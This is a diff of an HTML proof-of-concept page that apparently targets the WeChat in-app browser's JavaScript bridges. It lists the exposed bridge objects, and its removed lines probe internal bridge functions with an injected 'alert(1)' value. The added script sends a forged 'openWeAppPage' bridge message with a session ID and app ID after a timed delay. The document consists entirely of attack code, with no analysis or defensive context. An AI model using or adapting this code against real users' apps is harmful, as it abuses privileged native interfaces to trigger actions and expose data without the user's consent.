@@ -1,5 +1,6 @@
 <body>
 	<pre id='log'></pre>
+	<script src="./wxjs.js"></script>
 	<script>
 		function mylog(string) {
 		  	var log = document.getElementById('log');
@@ -16,20 +17,39 @@
 
   <script>
   	window.addEventListener('load', function(event) {
-  		if(typeof window.WeixinJSBridge !== 'undefined') mylog('WeixinJSBridge undefined');
-    	if(typeof window.WeixinJSContext !== 'undefined') mylog('WeixinJSContext undefined');
-    	if(typeof window.xwebToNative !== 'undefined') mylog('xwebToNative\n');
-		if(typeof window.__wx !== 'undefined') mylog('__wx!\n');
-    	if(typeof window.__wxtag !== 'undefined') mylog('__wxtag\n');
+  		mylog("[+] Printing Javascript-bridges available");
+  		if(typeof window.WeixinJSBridge !== 'undefined') mylog('WeixinJSBridge');
+    	if(typeof window.WeixinJSContext !== 'undefined') mylog('WeixinJSContext');
+    	if(typeof window.xwebToNative !== 'undefined') mylog('xwebToNative');
+		if(typeof window.__wx !== 'undefined') mylog('__wx');
+    	if(typeof window.__wxtag !== 'undefined') mylog('__wxtag');
 
-  		var a = window.__wx._getAllHosts("google.com, alert(1)");
-  		mylog(a);  	
-  		var c = window.__wx._getDgtVerifyRandomStr();
-  		mylog(c);
-  		var b = window.__wx._getHtmlContent("ABCD");
-  		mylog(b);
-  		var d = window.__wx._sendMessage("{'babo':'hoho'}");
-  		mylog(d);
-  	});
+    	setTimeout(()=> {
+			window.__wx._sendMessage(JSON.stringify({
+				"func": "openWeAppPage",
+				"params": {
+					"scene":73,
+					"sessionId":"6998359142851435608",
+					"userName":"gh_ed9c404e9686@app",
+					"relativeURL":"",
+					"docId":"",
+					"subScene":"",
+					"cookie":"",
+					"debugMode":0,
+					"appVersion":"65",
+					"appID":"wxd250b48686d39ba3",
+					"btn":"여는 중",
+					"desc":"n3PWJUApljTZa0J",
+					"jumpType":2,
+					"nickName":"全民狙神",
+					"tip":""全民狙神" 미니 프로그램의 콘텐츠",
+					"weappUrl":""
+				},
+				"__msg_type":"call",
+				"__callback_id":"1026"	
+			}));
+	},
+	3000);
+  });
   </script>
-</body> 
+</body>
